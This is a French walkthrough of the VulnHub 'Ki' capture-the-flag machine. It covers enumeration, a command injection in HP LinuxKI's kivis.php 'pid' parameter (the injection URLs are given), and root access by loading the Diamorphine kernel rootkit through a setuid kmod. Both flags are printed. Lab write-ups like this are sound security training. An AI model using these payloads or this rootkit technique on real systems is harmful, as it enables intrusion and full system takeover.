# Solution du CTF Ki de VulnHub

[Ki](https://www.vulnhub.com/entry/ki-1,641/) est un CTF posté sur VulnHub et créé par un certain *Cody Winkler*. La description du CTF... et bien il n'y en a pas donc on se dit soit l'auteur a tout fait à l'arrache soit seul la technique l'intéresse et il n'a pas perdu du temps sur la description.

Je préfère évidemment la seconde option, la suite nous le dira :)

```
Nmap scan report for 192.168.56.42
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bcdcffdc549fd9a604b37071179d4582 (RSA)
|   256 323a1837b060c5dda560acfb57d2d55c (ECDSA)
|_  256 ecddcb2b394d1525a815c3aa685910fc (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Datacenter Dudes - Contractors You Can Trust!
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

La page d'index ne semble contenir rien d'utilisable. Il est temps de fouiller un peu plus.

```shellsession
$ feroxbuster -u http://192.168.56.42/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.42/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      182l      684w    10427c http://192.168.56.42/index.html
403        9l       28w      278c http://192.168.56.42/.htaccess
200      182l      684w    10427c http://192.168.56.42/
403        9l       28w      278c http://192.168.56.42/.html
403        9l       28w      278c http://192.168.56.42/.php
403        9l       28w      278c http://192.168.56.42/.htpasswd
403        9l       28w      278c http://192.168.56.42/.htm
403        9l       28w      278c http://192.168.56.42/.htgroup
200        5l       36w      194c http://192.168.56.42/debug.php
403        9l       28w      278c http://192.168.56.42/wp-forum.phps
403        9l       28w      278c http://192.168.56.42/.htpasswds
403        9l       28w      278c http://192.168.56.42/.htaccess.bak
403        9l       28w      278c http://192.168.56.42/.htuser
403        9l       28w      278c http://192.168.56.42/.htc
403        9l       28w      278c http://192.168.56.42/.ht
403        9l       28w      278c http://192.168.56.42/.htacess
403        9l       28w      278c http://192.168.56.42/.htaccess.old
```

Le script *debug.php* trouvé m'est énigmatique. J'ai tenté d'y rajouter un paramètre file *pourtant* ça n'a rien donné.

<!-- T-56819 - added file parameter for easier page navigation with linuxki - chris -->

```html
<!-- T-56819 - added file parameter for easier page navigation with linuxki - chris -->

=== runki for Linux version 6.0
!!! runki script must be run as root
!!! currently logged in with UID 33
```

## Le Kiki de tous les Kiki

Une énumération sur les noms de dossiers n'a rien donné mais j'ai eu la bonne intuition de tester la présence des dossiers `runki` et `linuxki` et sur ce dernier le dossier existe mais répond avec un `403 Forbidden` 👍

J'enchaine donc sur une énumération de ce dossier :

```shellsession
$ feroxbuster -u http://192.168.56.42/linuxki/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.42/linuxki/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      324c http://192.168.56.42/linuxki/modules
301        9l       28w      320c http://192.168.56.42/linuxki/src
301        9l       28w      320c http://192.168.56.42/linuxki/man
403        9l       28w      278c http://192.168.56.42/linuxki/
403        9l       28w      278c http://192.168.56.42/linuxki/modules/
301        9l       28w      329c http://192.168.56.42/linuxki/experimental
403        9l       28w      278c http://192.168.56.42/linuxki/man/
403        9l       28w      278c http://192.168.56.42/linuxki/src/
200      552l     1474w    21952c http://192.168.56.42/linuxki/experimental/exp
403        9l       28w      278c http://192.168.56.42/linuxki/experimental/
301        9l       28w      333c http://192.168.56.42/linuxki/experimental/vis
301        9l       28w      324c http://192.168.56.42/linuxki/cluster
403        9l       28w      278c http://192.168.56.42/linuxki/cluster/
403        9l       28w      278c http://192.168.56.42/linuxki/experimental/vis/
301        9l       28w      325c http://192.168.56.42/linuxki/src/liki
200      184l      824w     7383c http://192.168.56.42/linuxki/src/liki/Makefile
403        9l       28w      278c http://192.168.56.42/linuxki/src/liki/
```

Intéressant, on trouve un fichier *Makefile* qui semble correspondre au build d'un module kernel. Extrait :

```makefile
build:
        $(MAKE) -C $(KERNELDIR) M=$(PWD) modules  
        cp likit.ko likit.ko.$(shell uname -r)

clean:
        rm -rf *.o *~ core .depend .*.cmd *.ko* *.mod.c *.unsigned *.order Module*

install:
        cp likit.ko /opt/linuxki/modules/likit.ko.$(shell uname -r)
        mkdir /lib/modules/$(shell uname -r)/misc 2>/dev/null
        cp likit.ko /lib/modules/$(shell uname -r)/misc/
```

Ce *LinuxKi* serait donc une vrai app et non un code custom. J'ai fait des recherches et je suis tombé sur [LinuxKI Toolset (Trace-based performance analysis tool)](https://github.com/HewlettPackard/LinuxKI) un projet open-source de *HewlettPackard*.

J'ai ensuite trouvé cet exploit : [HP LinuxKI 6.01 - Remote Command Injection - Multiple remote Exploit](https://www.exploit-db.com/exploits/48483)

Le projet en question semble par conséquent avoir une partie kernel mais aussi des scripts PHP donc un nommé *kivis.php* qui est vulnérable.

A tout hasard j'ai lancé [Nuclei](https://nuclei.projectdiscovery.io/) dessus pour voir si il trouvait la vulnérabilité mais ce n'est pas le cas.

Si on se tient à ce que l'exploit fait, il suffit d'injecter des commandes dans le paramètre `pid` de l'URL. J'ai donc essayé avec :

`http://192.168.56.42/linuxki/experimental/vis/kivis.php?type=kitrace&pid=;id;`

Mais je n'obtenais qu'une page d'erreur pour un utilitaire nommé `kiinfo`.

```textile
 Error: Argument missing
Usage:   kiinfo [options ...]
Options:
	-dump | -kitracedump [flag,flag...]
		 flags: debug_dir=<path>
			dur=<duration>
			events=<default | all | tool | event>
			subsys=<subsys>
			help
	-likid | -likidump [flag,flag...]
		 flags: debug_dir=<path>
			pid=<pid>
			tgid=<tgid>
			dev=<dev>
			cpu=<cpu>
			msr
			dur=<duration>
			events=<default | all | tool | event>
			subsys=<subsys>
			sysignore=<filename>
			help
	-likim | -likimerge [flag,flag...]
		 flags: help
--- snip ---
```

J'ai joué un peu avec le paramètre vulnérable et finalement il semblait mal digérer le point virgule :

`http://192.168.56.42/linuxki/experimental/vis/kivis.php?type=kitrace&pid=15|env;`

```
env: invalid option -- 't'
Try 'env --help' for more information.
```

Avec une syntaxe différente, en utilisant un pipe et en échappant la suite avec un octet nul j'obtient l'output que j'espère :

`http://192.168.56.42/linuxki/experimental/vis/kivis.php?type=kitrace&pid=15|env%00|`

```bash
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20343
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=0f681eaa0c72462694ecd42c2ab56c27
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/html/linuxki/experimental/vis
```

Une fois un reverse-ssh uploadé et exécuté je commence à fureter sur le système. Je récupére par exemple le contenu du `debug.php` croisé plus tôt

```php
<!-- T-56819 - added file parameter for easier page navigation with linuxki - chris -->

<?php

if (isset($_GET['environ'])){
    echo phpinfo();
}

if (isset($_GET['file'])){
    echo file_get_contents("linuxki/experimental/vis/" . $_GET['file'] . ".php");
}


echo shell_exec("/opt/linuxki/runki -f");

?>
```

Effectivement il y avait bien un paramètre `file` mais avec un prepend + append sans compter qu'il s'agit uniquement un directory traversal et non d'une inclusion.

Un utilisateur nommé *chris* est présent sur le système et a quelques fichiers lisibles :

```shellsession
www-data@ki:/home/chris$ ls -al
total 44
drwxr-xr-x 4 chris chris 4096 Dec 21  2020 .
drwxr-xr-x 3 root  root  4096 Dec 18  2020 ..
-rw------- 1 chris chris  596 Dec 19  2020 .bash_history
-rw-r--r-- 1 chris chris  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 chris chris 3771 Feb 25  2020 .bashrc
drwx------ 2 chris chris 4096 Dec 18  2020 .cache
drwxrwxr-x 3 chris chris 4096 Dec 19  2020 .local
-rw-r--r-- 1 chris chris  807 Feb 25  2020 .profile
-rw-r--r-- 1 chris chris 1410 Dec 21  2020 module_prep.log
-rw-rw-r-- 1 chris chris  373 Dec 21  2020 reminder.txt
-rw-rw-r-- 1 chris chris   66 Dec 19  2020 user.txt
```

Voici le contenu du reminder :

> Those fools completely messed up the LinuxKI demo for our sales leads!  
> 
> Hopefully the admins got the message about our build not being able to load some random kernel module.  
> I will pester them again about it to see if there's something they can do.  
> On the bright-side, they seem to have done a fine job patching our demo install, so We should be back in business soon...

Et le premier flag : *1487c1696540a7d14bf896a2191a9ab1*

## El dia de la morphine

Si je cherche les fichiers appartenant à l'utilisateur puis au groupe *chris* je remarque l'exécutable `kmod` qui est setuid root :

`-rwsr-xr-x 1 root chris 174424 Mar 12  2020 /usr/bin/kmod`

Il va donc falloir compiler une rootkit kernel sur le système, la charger et obtenir le root de cette façon.

J'ai d'abord galéré car `gcc` indiquait l'absence du binaire `cc1` sur le système. Je l'ai finalement retrouvé à l'emplacement `/usr/lib/gcc/x86_64-linux-gnu/9/cc1`.

J'ai créé un lien symbolique depuis le dossier courant vers le programme et rajouté le chemin dans la variable PATH.

J'ai tenté de compiler la rootkit [ivyl](https://github.com/ivyl/rootkit) mais la compilation échouait, visiblement le code était trop vieux pour le kernel du système (5.4.0-58).

La compilation s'est en revanche bien passée avec [Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x (x86/x86_64 and ARM64)](https://github.com/m0nad/Diamorphine).

L'aide de kmod indique qu'il fonctionne en partie grace à des liens symboliques. le binaire agit donc différemment selon comment il est appelé. Passer par un lien symbolique ne drop dans tous les cas pas le bit setuid.

On va donc utiliser `insmod` (l'un des liens symbolique) pour charger la rootkit puis envoyer le signal 64 au pid courant ce qui d'après la doc de *Diamorphine* donne les droits root au processus :

```bash
www-data@ki:/tmp/Diamorphine-master$ insmod diamorphine.ko 
www-data@ki:/tmp/Diamorphine-master$ kill -64 $$
www-data@ki:/tmp/Diamorphine-master$ id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
www-data@ki:/tmp/Diamorphine-master$ cd /root
www-data@ki:/root$ ls
root.txt  snap
www-data@ki:/root$ cat root.txt 
Congratulations! Feel free to tweet me @cwinfosec for feedback.

ae3e05609da7811c015920151e295612
```

Victory ! Le CTF nécessitait une bonne part d'intuition mais j'ai eu les idées claires.

*Publié le 4 novembre 2022*
